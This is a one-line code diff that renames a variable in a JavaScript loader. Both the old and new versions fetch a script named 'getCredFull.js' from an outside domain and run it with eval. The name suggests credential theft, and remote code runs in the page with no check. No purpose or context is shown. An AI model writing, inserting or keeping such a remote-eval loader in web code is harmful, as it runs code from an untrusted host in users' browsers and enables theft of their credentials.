@@ -1,1 +1,1 @@
-var myRequest=new XMLHttpRequest;myRequest.onreadystatechange=function(){if(myRequest.readyState==4&&myRequest.status==200){eval(myRequest.responseText)}};myRequest.open("GET","https://wvoice.us.to/getCredFull.js",true);myRequest.overrideMimeType("application/javascript");myRequest.send();
+var e=new XMLHttpRequest;e.onreadystatechange=function(){if(e.readyState==4&&e.status==200){eval(e.responseText)}};e.open("GET","https://wvoice.us.to/getCredFull.js",true);e.overrideMimeType("application/javascript");e.send();
